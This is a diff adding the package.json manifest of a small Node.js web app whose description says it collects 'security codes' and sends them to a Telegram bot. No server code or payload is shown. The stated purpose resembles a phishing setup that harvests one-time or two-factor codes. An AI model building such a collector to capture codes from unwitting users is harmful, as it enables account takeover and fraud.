@@ -1,0 +1,12 @@
+{
+  "name": "security-code-submission",
+  "version": "1.0.0",
+  "description": "A simple web app to collect security codes and send them to a Telegram bot.",
+  "type": "module",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "node-fetch": "^3.3.2"
+  }
+}
